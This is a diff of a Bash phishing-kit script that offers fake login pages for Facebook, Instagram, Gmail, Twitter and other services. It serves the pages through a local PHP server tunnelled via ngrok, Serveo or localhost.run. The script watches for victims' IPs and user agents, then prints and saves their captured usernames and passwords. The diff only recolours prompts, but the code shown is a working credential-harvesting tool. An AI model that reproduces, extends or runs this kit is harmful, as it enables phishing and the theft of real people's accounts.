@@ -29,9 +29,9 @@ printf " \e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;92m Spotify \e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;92m Twitter \e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[1;92m Yahoo \e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m26\e[0m\e[1;31m]\e[0m\e[1;92m Wordpress \e[0m\n"
-printf " \e[0m\e[1;31m[\e[0m\e[1;77m00\e[0m\e[1;31m]\e[0m\e[1;92mExit\e[0m\n"
+printf " \e[0m\e[1;31m[\e[0m\e[1;77m00\e[0m\e[1;31m] \e[0m\e[1;92mExit\e[0m\n"
 printf " \e[0m\n"        
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Select an option: \e[0m\e[1;91m\en' option
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Select an option: \e[0m\e[1;91m\en' option
 if [[ $option == 1 || $option == 01 ]]; then
 facebook
 elif [[ $option == 2 || $option == 02 ]]; then
@@ -81,7 +81,7 @@ printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;92m Advanced Voting Pol
 printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;92m Fake Security Login Page\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;92m Facebook Messenger Login Page\e[0m\n"
 printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Select an option: \e[0m\e[1;91m\en' option
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Select an option: \e[0m\e[1;91m\en' option
 if [[ $option == 1 || $option == 01 ]]; then
 server="facebook"
 start
@@ -107,7 +107,7 @@ printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;92m Traditional Login P
 printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;92m Auto Followers Login Page\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;92m Blue Badge Verify Login Page\e[0m\n"
 printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Select an option: \e[0m\e[1;91m\en' option
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Select an option: \e[0m\e[1;91m\en' option
 if [[ $option == 1 || $option == 01 ]]; then
 server="instagram"
 start
@@ -130,7 +130,7 @@ printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;92m Gmail Old Login Pag
 printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;92m Gmail New Login Page\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;92m Advanced Voting Poll\e[0m\n"
 printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Select an option: \e[0m\e[1;91m\en' option
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Select an option: \e[0m\e[1;91m\en' option
 if [[ $option == 1 || $option == 01 ]]; then
 server="google"
 start
@@ -178,7 +178,7 @@ printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;92m Serveo.net\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;92m Localhost.run\e[0m\n"
 d_o_server="2"
 printf "\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Select a Port Forwarding option: \e[0m\e[1;91m\en' option_server
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Select a Port Forwarding option: \e[0m\e[1;91m\en' option_server
 option_server="${option_server:-${d_o_server}}"
 if [[ $option_server == 3 || $option_server == 03 ]]; then
 start_s
@@ -204,18 +204,18 @@ rm -rf websites/$server/usernames.txt
 fi
 def_port="5555"
 printf "\e[0m\n"
-printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Select a Port (Default:\e[0m\e[1;91m %s \e[0m\e[1;34m): \e[0m\e[1;91m' $def_port
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Select a Port (Default:\e[0m\e[1;91m %s \e[0m\e[1;34m): \e[0m\e[1;91m' $def_port
 read port
 port="${port:-${def_port}}"
 start_serveo
 }
 start_serveo() {
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Initializing...\e[0m\e[1;34m(\e[0m\e[1;91mlocalhost:$port\e[0m\e[1;34m)\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Initializing...\e[0m\e[1;34m(\e[0m\e[1;91mlocalhost:$port\e[0m\e[1;34m)\e[0m\n"
 cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
 sleep 2
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Launching Serveo ..\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Launching Serveo ..\e[0m\n"
 if [[ -e linksender ]]; then
 rm -rf linksender
 fi
@@ -239,7 +239,7 @@ if [[ -e ngrok ]]; then
 echo ""
 else
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Initializing...\e[0m\e[1;34m(\e[0m\e[1;91mlocalhost:5555\e[0m\e[1;34m)\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Initializing...\e[0m\e[1;93m(\e[0m\e[1;91mlocalhost:5555\e[0m\e[1;93m)\e[0m\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
@@ -265,7 +265,7 @@ fi
 fi
 fi
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Launching Ngrok ..\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Launching Ngrok ..\e[0m\n"
 cd websites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
 sleep 2
 ./ngrok http 5555 > /dev/null 2>&1 &
@@ -277,15 +277,15 @@ found
 start_local(){
 def_port="5555"
 printf "\e[0m\n"
-printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Select a Port (Default:\e[0m\e[1;91m %s \e[0m\e[1;34m): \e[0m\e[1;91m' $def_port
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Select a Port (Default:\e[0m\e[1;91m %s \e[0m\e[1;93m): \e[0m\e[1;91m' $def_port
 read port
 port="${port:-${def_port}}"
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Initializing...\e[0m\e[1;34m(\e[0m\e[1;91mlocalhost:$port\e[0m\e[1;34m)\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Initializing...\e[0m\e[1;94m(\e[0m\e[1;91mlocalhost:$port\e[0m\e[1;93m)\e[0m\n"
 cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
 sleep 2
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Launching LocalHostRun ..\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Launching LocalHostRun ..\e[0m\n"
 printf "\n"
 if [[ -e linksender ]]; then
 rm -rf linksender
@@ -306,8 +306,8 @@ if [[ -e "websites/$server/usernames.txt" ]]; then
 account=$(grep -o 'Username:.*' websites/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
 password=$(grep -o 'Pass:.*' websites/$server/usernames.txt | cut -d ":" -f2)
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Account:\e[0m\e[1;91m %s\n\e[0m" $account
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Password:\e[0m\e[1;91m %s\n\e[0m" $password
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Account:\e[0m\e[1;91m %s\n\e[0m" $account
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Password:\e[0m\e[1;91m %s\n\e[0m" $password
 cat websites/$server/usernames.txt >> websites/$server/login_info.txt
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;91m Saved:\e[0m\e[1;92m websites/%s/login_info.txt\e[0m\n" $server
@@ -321,15 +321,15 @@ done
 start_l() {
 def_port="5555"
 printf "\e[0m\n"
-printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Select a Port (Default:\e[0m\e[1;91m %s \e[0m\e[1;34m): \e[0m\e[1;91m' $def_port
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Select a Port (Default:\e[0m\e[1;91m %s \e[0m\e[1;93m): \e[0m\e[1;91m' $def_port
 read port
 port="${port:-${def_port}}"
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Initializing...\e[0m\e[1;34m(\e[0m\e[1;91mlocalhost:$port\e[0m\e[1;34m)\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Initializing...\e[0m\e[1;93m(\e[0m\e[1;91mlocalhost:$port\e[0m\e[1;93m)\e[0m\n"
 cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
 sleep 2
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Successfully Hosted at :\e[0m\e[1;92m http://localhost:$port\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Successfully Hosted at :\e[0m\e[1;92m http://localhost:$port\e[0m\n"
 printf "\n"
 found
 }
@@ -340,14 +340,14 @@ printf "\n"
 while [ true ]; do
 if [[ -e "websites/$server/ip.txt" ]]; then
 printf "\n"
-printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;34m Victim IP Found!\n"
+printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;93m Victim IP Found!\n"
 printf "\n"
 c_ip
 rm -rf websites/$server/ip.txt
 fi
 sleep 0.75
 if [[ -e "websites/$server/usernames.txt" ]]; then
-printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;34m Login info Found !!\n"
+printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;93m Login info Found !!\n"
 printf "\n"
 c_cred
 rm -rf websites/$server/usernames.txt
@@ -360,7 +360,7 @@ touch websites/$server/login_info.txt
 ip=$(grep -a 'IP:' websites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 ua=$(grep 'User-Agent:' websites/$server/ip.txt | cut -d '"' -f2)
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Victim IP:\e[0m\e[1;91m %s\e[0m\n" $ip
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Victim IP:\e[0m\e[1;91m %s\e[0m\n" $ip
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;91m Saved:\e[0m\e[1;92m websites/%s/victim_ip.txt\e[0m\n" $server
 printf "\n"
@@ -370,8 +370,8 @@ c_cred() {
 account=$(grep -o 'Username:.*' websites/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
 password=$(grep -o 'Pass:.*' websites/$server/usernames.txt | cut -d ":" -f2)
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Account:\e[0m\e[1;91m %s\n\e[0m" $account
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;34m Password:\e[0m\e[1;91m %s\n\e[0m" $password
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Account:\e[0m\e[1;91m %s\n\e[0m" $account
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Password:\e[0m\e[1;91m %s\n\e[0m" $password
 cat websites/$server/usernames.txt >> websites/$server/login_info.txt
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;91m Saved:\e[0m\e[1;92m websites/%s/login_info.txt\e[0m\n" $server
